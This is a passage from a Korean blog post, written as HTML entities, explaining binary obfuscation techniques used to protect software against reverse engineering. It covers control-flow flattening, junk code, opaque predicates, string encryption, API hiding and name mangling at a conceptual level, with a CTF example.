&#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;&#xC744; &#xD558;&#xAC70;&#xB098; &#xD06C;&#xB799;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC5EC;&#xAE30;&#xC11C;&#xB294; &#x201C;&#xC81C;&#xD488; &#xBCF4;&#xD638;&#x201D;&#xB77C;&#xACE0; &#xD588;&#xB294;&#xB370; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB3C4; &#xC81C;&#xD488;&#xC774;&#xB77C;&#xBA74; &#xC81C;&#xD488;&#xC774;&#xAE34; &#xD558;&#xC8E0;.. &#xB300;&#xBD80;&#xBD84;&#xC758; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC5D0;&#xB3C4; &#xC774; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xAC00; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p></blockquote><p>&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xBD84;&#xC11D; &#xB3C4;&#xAD6C;(IDA, Ghidra &#xB4F1;)&#xC758; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xBC29;&#xD574;&#xD558;&#xACE0; &#xB514;&#xBC84;&#xAE45; &#xD750;&#xB984;&#xC744; &#xAD50;&#xB780;&#xD558;&#xBA70;, &#xC2EC;&#xC9C0;&#xC5B4;&#xB294; &#xC2E4;&#xD589; &#xC2DC;&#xAC04;&#xC5D0;&#xB9CC; &#xCF54;&#xB4DC;&#xAC00; &#xD574;&#xB3C5;&#xB418;&#xB294; &#xD615;&#xD0DC;&#xB85C; &#xAD6C;&#xD604;&#xB418;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xC2DC; &#xAE30;&#xBC95;&#xC73C;&#xB85C;&#xB294; &#x201C;&#xC81C;&#xC5B4; &#xD750;&#xB984; &#xBCC0;&#xD615;&#x201D;, &#x201C;&#xBB38;&#xC790;&#xC5F4; &#xC554;&#xD638;&#xD654;&#x201D;, &#x201C;&#xAC00;&#xC9DC; &#xCF54;&#xB4DC; &#xC0BD;&#xC785;&#x201D;, &#x201C;&#xB124;&#xC784; &#xB9F9;&#xAE00;&#xB9C1;&#x201D;, &#x201C;&#xAC04;&#xC811; &#xC810;&#xD504; &#xBC0F; &#xD638;&#xCD9C;&#x201D; &#xB4F1;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="1-4-&#xBC14;&#xC774;&#xB108;&#xB9AC;-&#xB09C;&#xB3C5;&#xD654;"><a href="#1-4-&#xBC14;&#xC774;&#xB108;&#xB9AC;-&#xB09C;&#xB3C5;&#xD654;" class="headerlink" title="1.4 &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;"></a>1.4 &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;</h3><p>&#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xD2B9;&#xBCC4;&#xD788; <strong>&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;</strong>&#xC5D0; &#xC9D1;&#xC911;&#xD558;&#xB824; &#xD569;&#xB2C8;&#xB2E4;. &#xC65C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xAC00; &#xC911;&#xC694;&#xD55C;&#xAC00;? &#xBB3C;&#xC73C;&#xC2E0;&#xB2E4;&#xBA74;, &#xC774;&#xC720;&#xB294; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;.  &#xC6B0;&#xB9AC;&#xAC00; &#xC4F0;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xB300;&#xBD80;&#xBD84;&#xC740; &#xACB0;&#xAD6D; <strong>&#xBC14;&#xC774;&#xB108;&#xB9AC;</strong> &#xD615;&#xD0DC;&#xB85C; &#xC81C;&#xACF5;&#xB418;&#xB294;&#xB370;, &#xC5EC;&#xAE30;&#xC5D4; &#xAC1C;&#xBC1C;&#xC0AC;&#xC758; &#xD575;&#xC2EC; &#xB178;&#xD558;&#xC6B0;, &#xC54C;&#xACE0;&#xB9AC;&#xC998;, &#xB77C;&#xC774;&#xC120;&#xC2A4; &#xC815;&#xBCF4; &#xB4F1;&#xC774; &#xB2F4;&#xACA8;&#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xBCF4;&#xD638;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xD06C;&#xB798;&#xD0B9;, &#xBD88;&#xBC95; &#xC7AC;&#xBC30;&#xD3EC;, &#xC2EC;&#xC9C0;&#xC5B4; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xC545;&#xC6A9;&#xAE4C;&#xC9C0; &#xC774;&#xC5B4;&#xC838; &#xB2E8;&#xC21C;&#xD55C; &#xAE30;&#xC220;&#xC801; &#xACF5;&#xACA9;&#xC744; &#xB118;&#xC5B4; &#xC2EC;&#xAC01;&#xD55C; &#xBE44;&#xC988;&#xB2C8;&#xC2A4; &#xD53C;&#xD574;&#xB97C; &#xC57C;&#xAE30;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB807;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD544;&#xC694;&#xD55C;&#xAC8C; Anti-Reversing &#xAE30;&#xBC95;&#xC774;&#xACE0; &#xC6B0;&#xB9AC;&#xB294; &#xADF8;&#xC5D0; &#xB300;&#xD574;&#xC11C; Part 1&#xBD80;&#xD130; &#xACC4;&#xC18D; &#xBD10;&#xC624;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC548;&#xD2F0; &#xB514;&#xBC84;&#xAE45;&#xC774; &#xB3D9;&#xC801; &#xBD84;&#xC11D;, &#xC989; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xB0B4;&#xBD80;&#xB97C; &#xB4E4;&#xC5EC;&#xB2E4;&#xBCF4;&#xB824;&#xB294; &#xC2DC;&#xB3C4;&#xB97C; &#xC801;&#xADF9;&#xC801;&#xC73C;&#xB85C; &#xAC10;&#xC9C0;&#xD558;&#xACE0; &#xBC29;&#xD574;&#xD55C;&#xB2E4;&#xBA74;, &#xB09C;&#xB3C5;&#xD654;&#xB294; <strong>&#xC815;&#xC801; &#xBD84;&#xC11D;</strong>&#xC744; &#xBC29;&#xD574;&#xD558;&#xB294; &#xB370; &#xCD08;&#xC810;&#xC744; &#xB9DE;&#xCDA5;&#xB2C8;&#xB2E4;. &#xC774; &#xB458;&#xC774; &#xACB0;&#xD569;&#xB420; &#xACBD;&#xC6B0;, &#xBD84;&#xC11D;&#xC790; &#xC785;&#xC7A5;&#xC5D0;&#xC11C;&#xB294; &#xADF8;&#xC57C;&#xB9D0;&#xB85C; &#xBB34;&#xC801;&#xACFC; &#xAC19;&#xC740; &#xBC29;&#xC5B4; &#xCCB4;&#xACC4;&#xB97C; &#xB9C8;&#xC8FC;&#xD558;&#xAC8C; &#xB418;&#xB294; &#xC148;&#xC774;&#xC8E0;.</p><p><img src="image.png" alt="image.png"></p><blockquote><p><del>(&#xC808;&#xB300; &#xB6AB;&#xB9AC;&#xC9C0; &#xC54A;&#xB294; &#xBC29;&#xD328;&#xB3C4; &#xB6AB;&#xB294; &#xCC3D;&#xC774; &#xC788;&#xAE34; &#xD558;&#xC8E0;&#x2026;)</del></p></blockquote><h2 id="2-&#xBC14;&#xC774;&#xB108;&#xB9AC;-&#xB09C;&#xB3C5;&#xD654;&#xC758;-&#xC138;-&#xAC00;&#xC9C0;-&#xCD95;"><a href="#2-&#xBC14;&#xC774;&#xB108;&#xB9AC;-&#xB09C;&#xB3C5;&#xD654;&#xC758;-&#xC138;-&#xAC00;&#xC9C0;-&#xCD95;" class="headerlink" title="2.&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xC758; &#xC138; &#xAC00;&#xC9C0; &#xCD95;"></a>2.&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xC758; &#xC138; &#xAC00;&#xC9C0; &#xCD95;</h2><p>&#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xC74C; &#xC138; &#xAC00;&#xC9C0; &#xCE74;&#xD14C;&#xACE0;&#xB9AC;&#xB85C; &#xBD84;&#xB958;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>(&#xC77C;&#xBD80;&#xBD84;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC9DA;&#xACE0; &#xB118;&#xC5B4;&#xAC00;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.)</p><h3 id="2-1-&#xAD6C;&#xC870;&#xC801;-&#xB09C;&#xB3C5;&#xD654;-Structural-Obfuscation"><a href="#2-1-&#xAD6C;&#xC870;&#xC801;-&#xB09C;&#xB3C5;&#xD654;-Structural-Obfuscation" class="headerlink" title="2.1 &#xAD6C;&#xC870;&#xC801; &#xB09C;&#xB3C5;&#xD654; (Structural Obfuscation)"></a>2.1 &#xAD6C;&#xC870;&#xC801; &#xB09C;&#xB3C5;&#xD654; (Structural Obfuscation)</h3><blockquote><p>&#xCF54;&#xB4DC;&#xC758; &#xC81C;&#xC5B4; &#xD750;&#xB984; &#xAD6C;&#xC870; &#xC790;&#xCCB4;&#xB97C; &#xB4A4;&#xD2C0;&#xC5B4; &#xBD84;&#xC11D;&#xC774; &#xC5B4;&#xB824;&#xC6CC;&#xC9C0;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xB09C;&#xB3C5;&#xD654;</p></blockquote><p>&#xC774; &#xBC94;&#xC8FC;&#xB294; &#xC8FC;&#xB85C; <strong>&#xC815;&#xC801; &#xBD84;&#xC11D; &#xB3C4;&#xAD6C;&#xAC00; &#xD568;&#xC218;&#xB098; &#xBE14;&#xB85D; &#xB2E8;&#xC704;&#xB85C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xBD84;&#xC11D;&#xD560; &#xB54C;</strong>, &#xAD6C;&#xC870;&#xB97C; &#xD30C;&#xC545;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB3C4;&#xB85D; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><ul><li><p><strong>&#xC81C;&#xC5B4; &#xD750;&#xB984; &#xD3C9;&#xD0C4;&#xD654; (Control Flow Flattening)</strong></p><p>  <img src="image%205.png" alt="ref. https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/"></p><p>  ref. <a href="https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/">https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/</a></p><ul><li>&#xC6D0;&#xB798;&#xB294; <code>if</code>, <code>while</code>, <code>switch</code> &#xB4F1;&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xB418;&#xB358; &#xB17C;&#xB9AC; &#xD750;&#xB984;&#xC744;, &#xBAA8;&#xB450; &#xD558;&#xB098;&#xC758; <code>dispatcher</code> &#xB8E8;&#xD504; &#xC548;&#xC5D0; &#xB123;&#xACE0;, <strong>&#xC0C1;&#xD0DC; &#xBCC0;&#xC218;</strong>&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB2E4;&#xC74C; &#xC2E4;&#xD589;&#xD560; &#xBE14;&#xB85D;&#xC744; &#xACB0;&#xC815;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xBC14;&#xAFC9;&#xB2C8;&#xB2E4;.<ul><li>&#xBAA8;&#xB4E0; &#xD750;&#xB984;&#xC774; &#xB8E8;&#xD504; &#xB0B4;&#xBD80;&#xC758; &#xC0C1;&#xD0DC; &#xC804;&#xC774;&#xB85C; &#xD45C;&#xD604;&#xB418;&#xC5B4; &#xC815;&#xC801; &#xBD84;&#xC11D; &#xB3C4;&#xAD6C;&#xC758; &#xD750;&#xB984; &#xD2B8;&#xB9AC; &#xBD84;&#xD574;&#xAC00; &#xBB34;&#xB825;&#xD654;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xB530;&#xB77C;&#xC11C; &#xD750;&#xB984;&#xC774; &#xBE44;&#xC9C1;&#xAD00;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xB418;&#xC5B4;, &#xC2E4;&#xC81C; &#xC2E4;&#xD589; &#xACBD;&#xB85C;&#xB97C; &#xCD94;&#xC801;&#xD558;&#xAE30; &#xC5B4;&#xB824;&#xC6CC;&#xC9D1;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xC774; &#xBD80;&#xBD84;&#xC740; &#xB4A4;&#xC5D0;&#xC11C; Obfuscator-LLVM(OLLVM) &#xC608;&#xC81C;&#xB97C; &#xD1B5;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</li></ul></li><li><strong>&#xAC00;&#xC9DC; &#xCF54;&#xB4DC; &#xC0BD;&#xC785; (Junk / Dead Code Insertion)</strong><ul><li>&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xC2E4;&#xC81C; &#xB3D9;&#xC791;&#xC5D0;&#xB294; &#xC544;&#xBB34;&#xB7F0; &#xC601;&#xD5A5;&#xC774; &#xC5C6;&#xB294; &#xC758;&#xBBF8; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;(Junk Code)&#xB098;, &#xC2E4;&#xC81C;&#xB85C;&#xB294; &#xC808;&#xB300; &#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xCF54;&#xB4DC;(Dead Code)&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xB294; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</li><li>&#xB300;&#xD45C;&#xC801;&#xC778; &#xC608;&#xB85C;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:<ul><li>&#xC758;&#xBBF8; &#xC5C6;&#xB294; &#xC5F0;&#xC0B0; (<code>x = x;</code>, <code>add eax, 0;</code>)</li><li>&#xC2E4;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xBD84;&#xAE30; (<code>if (false) { ... }</code>)</li></ul></li></ul></li><li><strong>&#xAC04;&#xC811; &#xBD84;&#xAE30; / &#xD638;&#xCD9C; (Indirect Branching)</strong><ul><li><code>jmp eax</code>, <code>call [ecx+0x10]</code>&#xCC98;&#xB7FC; &#xC8FC;&#xC18C; &#xACC4;&#xC0B0; &#xD6C4; &#xC810;&#xD504;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xB85C;&#xC368; &#xCF54;&#xB4DC; &#xD750;&#xB984;&#xC744; &#xCD94;&#xC801;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;(API &#xCD94;&#xB860; &#xBD88;&#xAC00;).</li></ul></li><li><strong>Opaque Predicate</strong><ul><li>&#xC870;&#xAC74;&#xC2DD;&#xC774; &#xD56D;&#xC0C1; true/false&#xC778; &#xBD84;&#xAE30; &#xC0BD;&#xC785;&#xD569;&#xB2C8;&#xB2E4;. (&#xC608;: <code>if ((x*x) &gt;= 0)</code>)</li><li>&#xC774; &#xCF54;&#xB4DC;&#xB294; &#xB3D9;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xBB34;&#xD574;&#xD558;&#xB098; &#xC815;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xD750;&#xB984; &#xBD84;&#xC11D;&#xC744; &#xBC29;&#xD574;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>&#xC8FC;&#xC758;&#xD560; &#xC810;:</strong><ul><li>&#xCEF4;&#xD30C;&#xC77C; &#xC2DC; &#xCD5C;&#xC801;&#xD654; &#xC635;&#xC158;(<code>O2</code>, <code>O3</code>)&#xC744; &#xC8FC;&#xBA74; &#xAD6C;&#xC870;&#xAC00; &#xCD5C;&#xC801;&#xD654; &#xB418;&#xBA74;&#xC11C; &#xC758;&#xBBF8; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;&#xB4E4;&#xC774; &#xC81C;&#xAC70;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xB530;&#xB77C;&#xC11C; &#xB09C;&#xB3C5;&#xD654; &#xC2DC;&#xC5D0;&#xB294; <strong>&#xCD5C;&#xC801;&#xD654; &#xC635;&#xC158;&#xC744; &#xBE44;&#xD65C;&#xC131;&#xD654;</strong>&#xD558;&#xAC70;&#xB098;, <strong>&#xB7F0;&#xD0C0;&#xC784; &#xBCC0;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC81C;&#xAC70;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xB294; &#xAE30;&#xBC95;</strong>&#xC744; &#xD568;&#xAED8; &#xC801;&#xC6A9;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</li></ul></li><li><p><strong>&#xD6A8;&#xACFC;:</strong></p><ul><li><p>&#xBD84;&#xC11D;&#xC790;&#xB294; &#xBD88;&#xD544;&#xC694;&#xD55C; &#xB8E8;&#xD504;&#xB098; &#xBD84;&#xAE30; &#xC18D;&#xC5D0; &#xC228;&#xC5B4; &#xC788;&#xB294; &#xC2E4;&#xC81C; &#xCF54;&#xB4DC;&#xB97C; &#xCC3E;&#xC544;&#xC57C; &#xD574;&#xC11C; &#xC2EC;&#xB9AC;&#xC801;&#xC73C;&#xB85C; &#xC9C0;&#xCE58;&#xACE0; &#xD5C8;&#xD0C8;&#xD568;&#xC744; &#xB290;&#xB07C;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC67C;&#xCABD; &#xC0AC;&#xC9C4;&#xCC98;&#xB7FC; &#xC0DD;&#xAE34; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD750;&#xB984;&#xC5D0;&#xC11C; &#xC624;&#xB978;&#xCABD; &#xC544;&#xB798;&#xC758; &#xB354;&#xBBF8;&#xCF54;&#xB4DC;&#xB97C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xBA87; &#xBD80;&#xBD84;&#xB9CC; &#xB123;&#xC5B4;&#xB3C4; &#xC624;&#xB978;&#xCABD;&#xACFC; &#xAC19;&#xC774; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD750;&#xB984;&#xC774; &#xB354; &#xBCF5;&#xC7A1;&#xD574;&#xC9D0;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>  <img src="image%206.png" alt="image.png"></p></li></ul></li></ul><p>&#x1F50D; <em>&#xAD6C;&#xC870;&#xC801; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xC8FC;&#xB85C; &#xBD84;&#xC11D; &#xB3C4;&#xAD6C;&#xC758; CFG &#xBD84;&#xC11D;&#xACFC; &#xD750;&#xB984; &#xD30C;&#xC545;&#xC744; &#xBB34;&#xB825;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</em></p><h3 id="2-2-&#xB370;&#xC774;&#xD130;-&#xB09C;&#xB3C5;&#xD654;-Data-Obfuscation"><a href="#2-2-&#xB370;&#xC774;&#xD130;-&#xB09C;&#xB3C5;&#xD654;-Data-Obfuscation" class="headerlink" title="2.2 &#xB370;&#xC774;&#xD130; &#xB09C;&#xB3C5;&#xD654; (Data Obfuscation)"></a>2.2 &#xB370;&#xC774;&#xD130; &#xB09C;&#xB3C5;&#xD654; (Data Obfuscation)</h3><blockquote><p>&#xB370;&#xC774;&#xD130; &#xC790;&#xCCB4;&#xB97C; &#xC228;&#xAE30;&#xAC70;&#xB098; &#xB2E4;&#xB974;&#xAC8C; &#xD45C;&#xD604;&#xD558;&#xC5EC; &#xC758;&#xBBF8;&#xB97C; &#xC720;&#xCD94;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xB09C;&#xB3C5;&#xD654;</p></blockquote><p>&#xC774; &#xBC94;&#xC8FC;&#xB294; &#xC8FC;&#xB85C; &#xBB38;&#xC790;&#xC5F4;, &#xC0C1;&#xC218;, API &#xBA85; &#xB4F1; <strong>&#xBD84;&#xC11D; &#xC2DC; &#xC720;&#xC6A9;&#xD55C; &#xB2E8;&#xC11C;</strong>&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xAC70;&#xB098; &#xC228;&#xAE30;&#xAE30; &#xC704;&#xD55C; &#xAE30;&#xBC95;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li><strong>&#xBB38;&#xC790;&#xC5F4; &#xC554;&#xD638;&#xD654; (String Encryption)</strong><ul><li>&#xC911;&#xC694;&#xD55C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xB7F0;&#xD0C0;&#xC784; &#xBCF5;&#xD638;&#xD654; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC804;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC815;&#xC801; &#xBD84;&#xC11D; &#xC2DC; <code>&quot;CreateProcess&quot;</code> &#xAC19;&#xC740; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xBCF4;&#xC774;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>&#xC0C1;&#xC218; &#xC778;&#xCF54;&#xB529; (Constant Encoding)</strong><ul><li>&#xC22B;&#xC790; &#xC0C1;&#xC218;&#xB098; &#xD50C;&#xB798;&#xADF8; &#xAC12;&#xC744; &#xAC04;&#xC811; &#xACC4;&#xC0B0;&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xD569;&#xB2C8;&#xB2E4;. (&#xC608;: <code>1337</code> &#x2192; <code>1000 + 337</code>)</li><li>&#xC774;&#xB85C;&#xC368; &#xC989;&#xAC01;&#xC801;&#xC73C;&#xB85C; &#xC0C1;&#xC218;&#xC758; &#xC758;&#xBBF8;&#xB97C; &#xD30C;&#xC545;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xB418;&#xACE0;, &#xD2B9;&#xD788; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC;&#xAC00; &#xC0B0;&#xC220;&#xC2DD;&#xC73C;&#xB85C; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xD45C;&#xD604;&#xB418;&#xBA74;&#xC11C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xBAA9;&#xC801;&#xC774;&#xB098; &#xC0C1;&#xD0DC;&#xB97C; &#xC720;&#xCD94;&#xD558;&#xB294; &#xB370; &#xAC78;&#xB9AC;&#xB294; &#xC2DC;&#xAC04;&#xC744; &#xB300;&#xD3ED; &#xC99D;&#xAC00;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</li></ul></li><li><strong>API &#xD638;&#xCD9C; &#xB09C;&#xB3C5;&#xD654; / Import Hiding</strong><ul><li>API &#xC774;&#xB984;&#xC744; &#xD574;&#xC2DC;&#xB098; &#xC554;&#xD638;&#xD654;&#xB85C; &#xC228;&#xAE30;&#xACE0;, &#xB7F0;&#xD0C0;&#xC784;&#xC5D0; &#xB3D9;&#xC801; &#xB85C;&#xB529;(<code>LoadLibrary</code>, <code>GetProcAddress</code>)&#xD569;&#xB2C8;&#xB2E4;.</li><li>IAT(Import Address Table)&#xAC00; &#xBB34;&#xB825;&#xD654;&#xB418;&#xC5B4; &#xC790;&#xB3D9; &#xBD84;&#xC11D; &#xBD88;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li></ul><p>&#x1F50D; <em>&#xB370;&#xC774;&#xD130; &#xB09C;&#xB3C5;&#xD654;&#xB294; &#xBD84;&#xC11D;&#xC790;&#xB098; &#xB3C4;&#xAD6C;&#xAC00; &#xC758;&#xBBF8; &#xC788;&#xB294; &#xC815;&#xBCF4;(&#xC2DD;&#xBCC4;&#xC790;, &#xBB38;&#xC790;&#xC5F4;, API &#xB4F1;)&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBC29;&#xD574;&#xD569;&#xB2C8;&#xB2E4;.</em></p><h3 id="2-3-&#xC54C;&#xACE0;&#xB9AC;&#xC998;-&#xB09C;&#xB3C5;&#xD654;-Algorithm-Obfuscation"><a href="#2-3-&#xC54C;&#xACE0;&#xB9AC;&#xC998;-&#xB09C;&#xB3C5;&#xD654;-Algorithm-Obfuscation" class="headerlink" title="2.3 &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xB09C;&#xB3C5;&#xD654; (Algorithm Obfuscation)"></a>2.3 &#xC54C;&#xACE0;&#xB9AC;&#xC998; &#xB09C;&#xB3C5;&#xD654; (Algorithm Obfuscation)</h3><blockquote><p>&#xC2E4;&#xC81C; &#xAE30;&#xB2A5;&#xC774;&#xB098; &#xB85C;&#xC9C1;&#xC744; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5B4; &#xAE30;&#xB2A5;&#xC744; &#xD30C;&#xC545;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4DC;&#xB294; &#xB09C;&#xB3C5;&#xD654;</p></blockquote><p>&#xC774;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC218;&#xD589;&#xD558;&#xB294; <strong>&#xD589;&#xC704; &#xC790;&#xCCB4;</strong>&#xB97C; &#xB09C;&#xD574;&#xD558;&#xAC8C; &#xD558;&#xC5EC;, &#xCF54;&#xB4DC;&#xB97C; &#xB72F;&#xC5B4;&#xBD10;&#xB3C4; &#x201C;&#xBB34;&#xC5C7;&#xC744; &#xD558;&#xB294;&#xC9C0;&#x201D;&#xB97C; &#xC54C;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><ul><li><p><strong>&#xB124;&#xC784; &#xB9F9;&#xAE00;&#xB9C1; (Name Mangling) &#xBC0F; &#xC2EC;&#xBCFC; &#xC81C;&#xAC70;</strong></p><ul><li>&#xB514;&#xBC84;&#xAE45; &#xC2EC;&#xBCFC;&#xC744; &#xC81C;&#xAC70;&#xD558;&#xAC70;&#xB098;, &#xD568;&#xC218;/&#xBCC0;&#xC218; &#xC774;&#xB984;&#xC744; &#xBB34;&#xC791;&#xC704; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xB300;&#xCCB4;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC774;&#xB85C;&#xC368; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xAE30;&#xB2A5; &#xB9E5;&#xB77D;&#xC744; &#xC77D;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</li><li><p>&#xB2E4;&#xC74C;&#xC740; Hack The Drone 2024(Final) &#xC5D0; &#xB098;&#xC628; &#xBB38;&#xC81C; &#xC911; &#xD328;&#xD0B7;&#xC744; &#xC778;&#xCF54;&#xB529;&#xD574;&#xC11C; &#xBE44;&#xD589;&#xC744; &#xC704;&#xD55C; &#xC2DC;&#xB3D9; &#xD328;&#xD0B7;&#xC744; &#xB9CC;&#xB4DC;&#xB294; &#xBB38;&#xC81C;&#xC758; &#xC77C;&#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xC218;&#xB3C4; &#xB79C;&#xB364; &#xC0DD;&#xC131;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; LFSR Galois &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC774;&#xC6A9;&#xD588;&#xB294;&#xB370;&#xC694;.</p><p><img src="image%207.png" alt="image.png"></p></li><li><p>&#xC704; &#xC0AC;&#xC9C4;&#xC744; &#xBCF4;&#xC2DC;&#xBA74; &#xD568;&#xC218; &#xC774;&#xB984;&#xC744; &#xD1B5;&#xD574; &#xC5B4;&#xB5A4; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC774; &#xC801;&#xC6A9;&#xB418;&#xC5C8;&#xB294;&#xC9C0;&#xB791; &#xAC01;&#xAC01;&#xC758; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB4E4;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC98;&#xB9AC;&#xAC00; &#xB418;&#xB294;&#xC9C0; &#xC27D;&#xAC8C; &#xD30C;&#xC545;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%208.png" alt="image.png"></p></li><li><p>&#xADF8;&#xB7EC;&#xB098; &#xB124;&#xC784; 